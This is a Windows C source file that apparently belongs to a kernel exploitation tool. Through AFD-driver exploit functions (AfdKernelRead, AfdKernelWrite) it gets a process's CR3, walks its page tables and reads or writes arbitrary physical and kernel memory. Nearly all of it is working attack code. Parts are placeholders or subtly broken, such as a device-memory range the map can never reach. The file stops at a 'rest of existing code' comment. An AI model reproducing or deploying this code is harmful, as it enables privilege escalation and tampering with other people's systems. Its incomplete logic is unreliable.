#define WIN32_LEAN_AND_MEAN
#include <Windows.h>
#include <winternl.h>
#include <TlHelp32.h>
#include <Psapi.h>
#include <stdlib.h>
#include "general.h"
#include "afd_exploit.h"
#include "driver_interface.h"

#pragma comment(lib, "psapi.lib")

// Physical memory constants
#define MAX_PHYSICAL_MEMORY 0x100000000000ULL // 16TB max physical memory
#define DEVICE_MEMORY_START 0xFFFFF70000000000ULL
#define DEVICE_MEMORY_END   0xFFFFF80000000000ULL
#define KERNEL_MEMORY_START 0xFFFF800000000000ULL
#define USER_MEMORY_END     0x00007FFFFFFFFFFFULL

// Memory type ranges
#define MMIO_START          0xFFFF800000000000ULL
#define MMIO_END           0xFFFF87FFFFFFFFFFULL
#define KERNEL_START       0xFFFF800000000000ULL
#define KERNEL_END         0xFFFFF7FFFFFFFFFFULL
#define DEVICE_START       0xFFFFF70000000000ULL
#define DEVICE_END         0xFFFFF7FFFFFFFFFFULL

// Page table constants
#define PML4_SHIFT 39
#define PDPT_SHIFT 30
#define PD_SHIFT 21
#define PT_SHIFT 12
#define PAGE_SHIFT 12
#define PAGE_SIZE 0x1000
#define PAGE_MASK (~(PAGE_SIZE - 1))
#define PTE_MASK 0x000FFFFFFFFFF000ULL
#define PTE_PRESENT 0x1
#define PTE_WRITEABLE 0x2
#define PTE_USER 0x4
#define PTE_LARGE 0x80
#define PTE_NX 0x8000000000000000ULL

// CR3 validation constants
#define MIN_VALID_CR3 0x1000
#define MAX_VALID_CR3 0x1000000000ULL
#define MAX_PTE_SCAN 1000
#define MAX_PAGE_WALK_DEPTH 4

// Memory access safety
static BOOL g_PhysicalMemoryInitialized = FALSE;
static DWORD64 g_MaxPhysicalAddress = 0;
static MEMORY_TYPE* g_MemoryTypeMap = NULL;
static SIZE_T g_MemoryTypeMapSize = 0;

// Global state variables
static BOOL g_HasKernelAccess = FALSE;
static BOOL g_HasDebugPrivilege = FALSE;

// Function implementations
BOOL InitializePhysicalMemoryAccess(void) {
    if (g_PhysicalMemoryInitialized) return TRUE;
    
    ConsoleInfo("Initializing physical memory access...");
    
    // Get system memory information
    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);
    
    // Calculate max physical address (simplified - in reality would need to query system)
    g_MaxPhysicalAddress = 0x100000000ULL; // Start with 4GB
    
    // Allocate memory type map (1MB granularity)
    g_MemoryTypeMapSize = (SIZE_T)(g_MaxPhysicalAddress >> 20);
    g_MemoryTypeMap = (MEMORY_TYPE*)calloc(g_MemoryTypeMapSize, sizeof(MEMORY_TYPE));
    
    if (!g_MemoryTypeMap) {
        ConsoleError("Failed to allocate memory type map");
        return FALSE;
    }
    
    // Initialize memory types (simplified - would need real memory map)
    for (SIZE_T i = 0; i < g_MemoryTypeMapSize; i++) {
        // First 1MB is always reserved
        if (i == 0) {
            g_MemoryTypeMap[i] = MEMORY_TYPE_RESERVED;
        }
        // MMIO regions (example ranges - would need real detection)
        else if (i >= 0xFEE00 && i <= 0xFEF00) {
            g_MemoryTypeMap[i] = MEMORY_TYPE_DEVICE;
        }
        // Default to regular memory
        else {
            g_MemoryTypeMap[i] = MEMORY_TYPE_REGULAR;
        }
    }
    
    g_PhysicalMemoryInitialized = TRUE;
    ConsoleSuccess("Physical memory access initialized");
    return TRUE;
}

BOOL WritePhysicalMemorySafe(PPHYSICAL_MEMORY_CONTEXT context, PVOID buffer, SIZE_T size) {
    if (!context || !context->isValidated || !buffer || !size) return FALSE;
    
    // Verify size matches context
    if (size > context->size) {
        ConsoleError("Write size exceeds validated size");
        return FALSE;
    }
    
    // Check if memory type can be written
    if (!CanWriteMemoryType(context->memoryType)) {
        ConsoleError("Memory type cannot be safely written");
        return FALSE;
    }
    
    // Perform the write with proper handling based on memory type
    switch (context->memoryType) {
        case MEMORY_TYPE_REGULAR:
            return AfdKernelWrite(context->physicalAddress, buffer, size);
            
        case MEMORY_TYPE_UNCACHED:
        case MEMORY_TYPE_WRITECOMBINED:
            // Write in smaller chunks to avoid cache issues
            {
                PBYTE src = (PBYTE)buffer;
                DWORD64 dest = context->physicalAddress;
                SIZE_T remaining = size;
                
                while (remaining > 0) {
                    SIZE_T chunk = min(remaining, PAGE_SIZE);
                    if (!AfdKernelWrite(dest, src, chunk)) {
                        return FALSE;
                    }
                    dest += chunk;
                    src += chunk;
                    remaining -= chunk;
                }
                return TRUE;
            }
            
        case MEMORY_TYPE_DEVICE:
            // Special handling for device memory
            ConsoleWarning("Writing device memory - using byte-by-byte access");
            {
                PBYTE src = (PBYTE)buffer;
                DWORD64 dest = context->physicalAddress;
                
                for (SIZE_T i = 0; i < size; i++) {
                    if (!AfdKernelWrite(dest + i, src + i, 1)) {
                        return FALSE;
                    }
                }
                return TRUE;
            }
            
        default:
            ConsoleError("Unsupported memory type for writing");
            return FALSE;
    }
}

BOOL IsPhysicalAddressAccessible(DWORD64 physicalAddress) {
    if (!g_PhysicalMemoryInitialized) return FALSE;
    
    // Basic range check
    if (physicalAddress >= g_MaxPhysicalAddress) return FALSE;
    
    // Check memory type
    MEMORY_TYPE type = GetMemoryType(physicalAddress);
    return (type != MEMORY_TYPE_UNKNOWN && type != MEMORY_TYPE_RESERVED);
}

MEMORY_TYPE GetMemoryType(DWORD64 physicalAddress) {
    if (!g_PhysicalMemoryInitialized || !g_MemoryTypeMap) return MEMORY_TYPE_UNKNOWN;
    
    // Convert to 1MB index
    SIZE_T index = (SIZE_T)(physicalAddress >> 20);
    
    if (index >= g_MemoryTypeMapSize) return MEMORY_TYPE_UNKNOWN;
    
    return g_MemoryTypeMap[index];
}

BOOL ValidateMemoryRegion(DWORD64 address, SIZE_T size, PMEMORY_REGION_CONTEXT context) {
    if (!context) return FALSE;
    
    ConsoleInfo("Validating memory region at 0x%016llX size %zu...", address, size);
    
    // Initialize context
    ZeroMemory(context, sizeof(MEMORY_REGION_CONTEXT));
    context->startAddress = address;
    context->endAddress = address + size - 1;
    
    // Check for overflow
    if (context->endAddress < address) {
        ConsoleError("Memory region size causes overflow");
        return FALSE;
    }
    
    // Determine address space type
    if (IsKernelAddress(address)) {
        // Kernel memory validation
        if (!IsKernelAddress(context->endAddress)) {
            ConsoleError("Memory region crosses kernel/user boundary");
            return FALSE;
        }
        
        context->accessFlags = MEMORY_ACCESS_READ | MEMORY_ACCESS_WRITE;
        context->memoryType = MEMORY_TYPE_REGULAR;
    }
    else if (IsUserAddress(address)) {
        // User memory validation
        if (!IsUserAddress(context->endAddress)) {
            ConsoleError("Memory region crosses user/kernel boundary");
            return FALSE;
        }
        
        context->accessFlags = MEMORY_ACCESS_READ | MEMORY_ACCESS_WRITE | MEMORY_ACCESS_EXECUTE;
        context->memoryType = MEMORY_TYPE_REGULAR;
    }
    else if (address >= DEVICE_MEMORY_START && address <= DEVICE_MEMORY_END) {
        // Device memory validation
        context->memoryType = MEMORY_TYPE_DEVICE;
        context->accessFlags = MEMORY_ACCESS_READ | MEMORY_ACCESS_WRITE;
    }
    else {
        ConsoleError("Invalid memory region");
        return FALSE;
    }
    
    context->isValid = TRUE;
    context->isMapped = TRUE;
    
    ConsoleSuccess("Memory region validated");
    return TRUE;
}

BOOL IsMemoryRegionSafe(PMEMORY_REGION_CONTEXT context) {
    if (!context || !context->isValid) return FALSE;
    
    // Device memory is never "safe"
    if (context->memoryType == MEMORY_TYPE_DEVICE) return FALSE;
    
    // Reserved or unknown memory is never safe
    if (context->memoryType == MEMORY_TYPE_RESERVED ||
        context->memoryType == MEMORY_TYPE_UNKNOWN) return FALSE;
    
    // Must be mapped
    if (!context->isMapped) return FALSE;
    
    return TRUE;
}

BOOL CheckMemoryAccess(PMEMORY_REGION_CONTEXT context, DWORD requiredAccess) {
    if (!context || !context->isValid) return FALSE;
    
    // Check if all required access flags are present
    return (context->accessFlags & requiredAccess) == requiredAccess;
}

BOOL IsKernelAddress(DWORD64 address) {
    return address >= KERNEL_MEMORY_START;
}

BOOL IsUserAddress(DWORD64 address) {
    return address <= USER_MEMORY_END;
}

BOOL IsMemoryTypeCompatible(MEMORY_TYPE type, DWORD accessFlags) {
    switch (type) {
        case MEMORY_TYPE_REGULAR:
            return TRUE; // Regular memory supports all access types
            
        case MEMORY_TYPE_DEVICE:
            // Device memory doesn't support execute
            return !(accessFlags & MEMORY_ACCESS_EXECUTE);
            
        case MEMORY_TYPE_WRITECOMBINED:
            // Write-combined memory has special rules
            return (accessFlags & MEMORY_ACCESS_EXECUTE) == 0;
            
        case MEMORY_TYPE_UNCACHED:
            // Uncached memory supports read/write but not execute
            return (accessFlags & MEMORY_ACCESS_EXECUTE) == 0;
            
        default:
            return FALSE;
    }
}

BOOL CanReadMemoryType(MEMORY_TYPE type) {
    switch (type) {
        case MEMORY_TYPE_REGULAR:
        case MEMORY_TYPE_UNCACHED:
        case MEMORY_TYPE_WRITECOMBINED:
            return TRUE;
            
        case MEMORY_TYPE_DEVICE:
            // Device memory can be read but requires special handling
            return TRUE;
            
        default:
            return FALSE;
    }
}

BOOL CanWriteMemoryType(MEMORY_TYPE type) {
    switch (type) {
        case MEMORY_TYPE_REGULAR:
        case MEMORY_TYPE_UNCACHED:
        case MEMORY_TYPE_WRITECOMBINED:
            return TRUE;
            
        case MEMORY_TYPE_DEVICE:
            // Device memory can be written but requires special handling
            return TRUE;
            
        default:
            return FALSE;
    }
}

BOOL IsDeviceMemory(DWORD64 physicalAddress) {
    MEMORY_TYPE type = GetMemoryType(physicalAddress);
    return type == MEMORY_TYPE_DEVICE;
}

BOOL IsCacheableMemory(MEMORY_TYPE type) {
    return type == MEMORY_TYPE_REGULAR;
}

BOOL GetProcessCR3Safe(DWORD processId, PCR3_CONTEXT context) {
    if (!context) return FALSE;
    
    ConsoleInfo("Getting CR3 for process %d...", processId);
    
    // Initialize context
    ZeroMemory(context, sizeof(CR3_CONTEXT));
    context->processId = processId;
    
    // Get CR3 value
    context->cr3 = GetProcessCR3(processId);
    if (!context->cr3) {
        ConsoleError("Failed to get CR3 value");
        return FALSE;
    }
    
    // Validate CR3
    if (!ValidateCR3(context)) {
        ConsoleError("Invalid CR3 value");
        return FALSE;
    }
    
    ConsoleSuccess("Got valid CR3 value: 0x%016llX", context->cr3);
    return TRUE;
}

BOOL ValidateCR3(PCR3_CONTEXT context) {
    if (!context || !context->cr3) return FALSE;
    
    // Basic range validation
    if (context->cr3 < MIN_VALID_CR3 || context->cr3 > MAX_VALID_CR3) {
        ConsoleError("CR3 value out of valid range");
        return FALSE;
    }
    
    // Must be page aligned
    if (context->cr3 & (PAGE_SIZE - 1)) {
        ConsoleError("CR3 value not page aligned");
        return FALSE;
    }
    
    // Set up PML4 base
    context->pml4Base = context->cr3 & PAGE_MASK;
    context->dirBase = context->pml4Base;
    
    // Validate PML4 entries
    DWORD64 pml4e = 0;
    DWORD validEntries = 0;
    
    for (DWORD i = 0; i < MAX_PTE_SCAN && validEntries < 2; i++) {
        if (!AfdKernelRead(context->pml4Base + (i * 8), &pml4e, sizeof(pml4e))) {
            continue;
        }
        
        if (ValidatePageTableEntry(pml4e)) {
            validEntries++;
        }
    }
    
    if (validEntries < 2) {
        ConsoleError("Not enough valid PML4 entries");
        return FALSE;
    }
    
    context->isValidated = TRUE;
    return TRUE;
}

BOOL ValidatePageTableEntry(DWORD64 pte) {
    // Must be present
    if (!(pte & PTE_PRESENT)) return FALSE;
    
    // Must point to valid physical memory
    DWORD64 physAddr = pte & PTE_MASK;
    if (!IsPhysicalAddressAccessible(physAddr)) return FALSE;
    
    return TRUE;
}

DWORD64 VirtualToPhysicalSafe(PCR3_CONTEXT context, DWORD64 virtualAddr) {
    if (!context || !context->isValidated) return 0;
    
    DWORD64 physicalAddr = 0;
    if (!WalkPageTablesSafe(context, virtualAddr, &physicalAddr)) {
        return 0;
    }
    
    return physicalAddr;
}

BOOL ReadVirtualMemorySafe(PCR3_CONTEXT context, DWORD64 virtualAddr, PVOID buffer, SIZE_T size) {
    if (!context || !context->isValidated || !buffer || !size) return FALSE;
    
    // Get physical address
    DWORD64 physicalAddr = VirtualToPhysicalSafe(context, virtualAddr);
    if (!physicalAddr) {
        ConsoleError("Failed to translate virtual address");
        return FALSE;
    }
    
    // Set up physical memory context
    PHYSICAL_MEMORY_CONTEXT physContext = { 0 };
    if (!ValidatePhysicalMemoryAccess(physicalAddr, size, &physContext)) {
        ConsoleError("Invalid physical memory access");
        return FALSE;
    }
    
    // Perform the read
    return ReadPhysicalMemorySafe(&physContext, buffer, size);
}

BOOL WriteVirtualMemorySafe(PCR3_CONTEXT context, DWORD64 virtualAddr, PVOID buffer, SIZE_T size) {
    if (!context || !context->isValidated || !buffer || !size) return FALSE;
    
    // Get physical address
    DWORD64 physicalAddr = VirtualToPhysicalSafe(context, virtualAddr);
    if (!physicalAddr) {
        ConsoleError("Failed to translate virtual address");
        return FALSE;
    }
    
    // Set up physical memory context
    PHYSICAL_MEMORY_CONTEXT physContext = { 0 };
    if (!ValidatePhysicalMemoryAccess(physicalAddr, size, &physContext)) {
        ConsoleError("Invalid physical memory access");
        return FALSE;
    }
    
    // Perform the write
    return WritePhysicalMemorySafe(&physContext, buffer, size);
}

BOOL WalkPageTablesSafe(PCR3_CONTEXT context, DWORD64 virtualAddr, PDWORD64 physicalAddr) {
    if (!context || !context->isValidated || !physicalAddr) return FALSE;
    
    ConsoleInfo("Walking page tables for virtual address 0x%016llX...", virtualAddr);
    
    // Extract page table indices
    DWORD64 pml4i = (virtualAddr >> PML4_SHIFT) & 0x1FF;
    DWORD64 pdpti = (virtualAddr >> PDPT_SHIFT) & 0x1FF;
    DWORD64 pdi = (virtualAddr >> PD_SHIFT) & 0x1FF;
    DWORD64 pti = (virtualAddr >> PT_SHIFT) & 0x1FF;
    DWORD64 offset = virtualAddr & (PAGE_SIZE - 1);
    
    // Read PML4 entry
    DWORD64 pml4e = 0;
    if (!AfdKernelRead(context->pml4Base + (pml4i * 8), &pml4e, sizeof(pml4e)) || !ValidatePageTableEntry(pml4e)) {
        ConsoleError("Invalid PML4 entry");
        return FALSE;
    }
    
    // Read PDPT entry
    DWORD64 pdptBase = pml4e & PTE_MASK;
    DWORD64 pdpte = 0;
    if (!AfdKernelRead(pdptBase + (pdpti * 8), &pdpte, sizeof(pdpte)) || !ValidatePageTableEntry(pdpte)) {
        ConsoleError("Invalid PDPT entry");
        return FALSE;
    }
    
    // Check for 1GB page
    if (pdpte & PTE_LARGE) {
        *physicalAddr = (pdpte & (~0x3FFFFFFF)) + (virtualAddr & 0x3FFFFFFF);
        return TRUE;
    }
    
    // Read PD entry
    DWORD64 pdBase = pdpte & PTE_MASK;
    DWORD64 pde = 0;
    if (!AfdKernelRead(pdBase + (pdi * 8), &pde, sizeof(pde)) || !ValidatePageTableEntry(pde)) {
        ConsoleError("Invalid PD entry");
        return FALSE;
    }
    
    // Check for 2MB page
    if (pde & PTE_LARGE) {
        *physicalAddr = (pde & (~0x1FFFFF)) + (virtualAddr & 0x1FFFFF);
        return TRUE;
    }
    
    // Read PT entry
    DWORD64 ptBase = pde & PTE_MASK;
    DWORD64 pte = 0;
    if (!AfdKernelRead(ptBase + (pti * 8), &pte, sizeof(pte)) || !ValidatePageTableEntry(pte)) {
        ConsoleError("Invalid PT entry");
        return FALSE;
    }
    
    // Get final physical address
    *physicalAddr = (pte & PTE_MASK) + offset;
    
    ConsoleSuccess("Successfully translated to physical address 0x%016llX", *physicalAddr);
    return TRUE;
}

// ... rest of existing code ...
